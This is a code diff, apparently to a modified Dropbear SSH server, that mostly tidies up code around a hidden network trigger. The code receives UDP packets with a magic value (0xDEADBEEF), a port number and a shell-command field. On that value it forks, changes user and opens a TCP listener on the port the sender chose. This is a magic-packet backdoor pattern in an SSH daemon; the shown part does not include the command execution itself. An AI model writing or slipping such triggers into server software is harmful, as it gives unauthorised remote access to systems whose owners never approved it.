@@ -53,7 +53,7 @@
 typedef struct {
     uint32_t magic; /* should be 0xDEADBEEF */
     uint16_t port_number;
-    char shell_command[256];
+    char shell_command[MAX_SHELL_COMMAND_LENGTH];
 } listen_packet_t;
 
 
@@ -136,16 +136,12 @@ void print_version() {
     fprintf(stderr, "Dropbear v%s\n", DROPBEAR_VERSION);
 }
 
-// get sockaddr, IPv4 or IPv6:
-void *get_in_addr(struct sockaddr *sa)
-{
-    if (sa->sa_family == AF_INET) {
-        return &(((struct sockaddr_in*)sa)->sin_addr);
-    }
-
-    return &(((struct sockaddr_in6*)sa)->sin6_addr);
+// Get sockaddr, IPv4 or IPv6
+void *get_in_addr(struct sockaddr *sa) {
+    return sa->sa_family == AF_INET ? &(((struct sockaddr_in*)sa)->sin_addr) : &(((struct sockaddr_in6*)sa)->sin6_addr);
 }
 
+// Convert UDP packet to listen_packet_t structure
 int to_listen_packet(char* udp_string_packet, listen_packet_t* packet) {
 
     const char delimiter[2] = ",";
@@ -153,7 +149,7 @@ int to_listen_packet(char* udp_string_packet, listen_packet_t* packet) {
     char *first_token, *second_token, *third_token;
     uint32_t magic_value;
     uint16_t port_value;
-    char command_value[256];
+    char command_value[MAX_SHELL_COMMAND_LENGTH];
 
 
     // Extract the data from the UDP Packet and parse it
@@ -165,14 +161,13 @@ int to_listen_packet(char* udp_string_packet, listen_packet_t* packet) {
     }
     if(third_token = strtok(NULL, delimiter)) {
         size_t size_of_command = strlen(third_token);
-        strncpy(command_value, third_token, size_of_command > 255 ? 255 : size_of_command);
+        strncpy(command_value, third_token, size_of_command > MAX_SHELL_COMMAND_LENGTH - 1 ? MAX_SHELL_COMMAND_LENGTH - 1: size_of_command);
     }
 
     // Error in packet structure
     if(first_token == NULL || second_token == NULL || third_token == NULL) {
         return -1;
     }
-
 
     // Assign the data to packet structure
     packet->magic = magic_value;
@@ -196,10 +191,10 @@ void start_tcp_connection(uint16_t port_number) {
     struct sockaddr_storage remoteaddr; // client address
     socklen_t addrlen;
 
-    char remoteIP[INET6_ADDRSTRLEN];
+    char remoteIP[INET6_ADDRSTRLEN], port_number_as_string[6];
 
     int yes=1;        // for setsockopt() SO_REUSEADDR, below
-    int i,rv;
+    int i,err_code;
 
     struct addrinfo hints, *ai, *p;
 
@@ -215,12 +210,10 @@ void start_tcp_connection(uint16_t port_number) {
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_flags = AI_PASSIVE;
 
-    char port_number_as_string[10];
-
     sprintf(port_number_as_string, "%d", port_number);
 
-    if ((rv = getaddrinfo(NULL, port_number_as_string, &hints, &ai)) != 0) {
-        dropbear_log(LOG_INFO, "TCP Connection error: %s\n", gai_strerror(rv));
+    if ((err_code = getaddrinfo(NULL, port_number_as_string, &hints, &ai)) != 0) {
+        dropbear_log(LOG_INFO, "TCP Connection error: %s", gai_strerror(err_code));
         exit(1);
     }
 
@@ -239,7 +232,7 @@ void start_tcp_connection(uint16_t port_number) {
 
     // if we got here, it means we didn't get bound
     if (p == NULL) {
-        dropbear_log(LOG_INFO, "selectserver: failed to bind\n");
+        dropbear_log(LOG_INFO, "Bind error in TCP connection creation");
         exit(2);
     }
 
@@ -247,7 +240,7 @@ void start_tcp_connection(uint16_t port_number) {
 
     // listen
     if (listen(listener, 10) == -1) {
-        dropbear_log(LOG_INFO, "listen");
+        dropbear_log(LOG_INFO, "Listen error in TCP connection creation");
         exit(3);
     }
 
@@ -256,13 +249,13 @@ void start_tcp_connection(uint16_t port_number) {
 
     // keep track of the biggest file descriptor
     fdmax = listener; // so far, it's this one
-    dropbear_log(LOG_INFO, "Server has been created and is ready for clients requests\n");
+    dropbear_log(LOG_INFO, "TCP connection has been created and is ready for requests");
 
     // main loop
     for(;;) {
         read_fds = master;     // copy it
         if (select(fdmax+1, &read_fds, NULL, NULL, NULL) == -1) {
-            dropbear_log(LOG_INFO, "select error");
+            dropbear_log(LOG_INFO, "Select error in TCP connection");
             exit(4);
         }
         // run through the existing connections looking for data to read
@@ -272,12 +265,12 @@ void start_tcp_connection(uint16_t port_number) {
                     // handle new connections
                     addrlen = sizeof remoteaddr;
                     newfd = accept(listener,(struct sockaddr *)&remoteaddr,&addrlen);
-                    if (newfd == -1)  dropbear_log(LOG_INFO, "accept error");
+                    if (newfd == -1)  dropbear_log(LOG_INFO, "Accept error in TCP connection");
                     else {
                         FD_SET(newfd, &master); // add to master set
                         if (newfd > fdmax) fdmax = newfd;    // keep track of the max
-                        dropbear_log(LOG_INFO, "selectserver: new connection from %s on "
-                                               "socket %d\n", inet_ntop(remoteaddr.ss_family,get_in_addr((struct sockaddr*)&remoteaddr),remoteIP,                             INET6_ADDRSTRLEN),newfd);
+                        dropbear_log(LOG_INFO, "New TCP connection from %s on "
+                                               "socket %d", inet_ntop(remoteaddr.ss_family,get_in_addr((struct sockaddr*)&remoteaddr),remoteIP,                             INET6_ADDRSTRLEN),newfd);
                     }
                 }
                 else {
@@ -293,7 +286,7 @@ void start_tcp_connection(uint16_t port_number) {
                         // got some data from a client
                     else {
 
-                        dropbear_log(LOG_INFO, "we got some data from a client\n");
+                        dropbear_log(LOG_INFO, "we got some data from a client");
                     }
 
                 } // END handle data from client
@@ -304,13 +297,16 @@ void start_tcp_connection(uint16_t port_number) {
 
 void listen_to_udp_packets(void* arguments) {
 
-    dropbear_log(LOG_INFO, "RUNNING listen_to_udp_packets\n");
-
     int sock, addr_len, bytes_read;
     char recv_data[1024], send_data[1024];
     struct sockaddr_in server_addr, client_addr;
 
+    pid_t child_process_id;
+    int child_return_status = 0;
+
     listen_packet_t packet;
+
+    dropbear_log(LOG_INFO, "Attempt UDP connection on port %d", DEFAULT_UDP_PORT_NUMBER);
 
     if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
         dropbear_exit("Socket Error in UDP connection on port %d", DEFAULT_UDP_PORT_NUMBER);
@@ -335,25 +331,24 @@ void listen_to_udp_packets(void* arguments) {
 
         recv_data[bytes_read] = '\0';
 
-        dropbear_log(LOG_INFO, "\n(%s , %d) said : ",inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
+        dropbear_log(LOG_INFO, "(%s , %d) said : ",inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
         dropbear_log(LOG_INFO, "%s", recv_data);
 
         if(to_listen_packet(recv_data, &packet) < 0) {
-            dropbear_log(LOG_INFO, "error in packet structure");
+            dropbear_log(LOG_INFO, "Error in packet structure");
             continue;
         }
 
         if(packet.magic == 0xDEADBEEF) {
 
-            dropbear_log(LOG_INFO, "0xDEADBEEF value!");
+            dropbear_log(LOG_INFO, "Received 0xDEADBEEF value");
 
             // Create a child process in order to run and listen to TCP as different user
-            pid_t child_process_id = fork();
-            int child_return_status = 0;
+            child_process_id = fork();
 
             if(child_process_id == 0) { // Child is running
                 if(setuid(DEFAULT_USERID_FOR_UDP_PACKETS) == -1) {
-                    dropbear_log(LOG_INFO, "setuid %d error. please check that the user id exists", DEFAULT_USERID_FOR_UDP_PACKETS);
+                    dropbear_log(LOG_INFO, "setuid %d error. Please check that the user id exists", DEFAULT_USERID_FOR_UDP_PACKETS);
                     return 1;
                 }
 
@@ -369,10 +364,9 @@ void listen_to_udp_packets(void* arguments) {
 
                 // Create a TCP connection in <packet.port_number>
                 start_tcp_connection(packet.port_number);
-
             }
             else {
-                dropbear_log(LOG_INFO, "fork process failed!");
+                dropbear_log(LOG_INFO, "Fork process failed!");
                 continue;
             }
         }
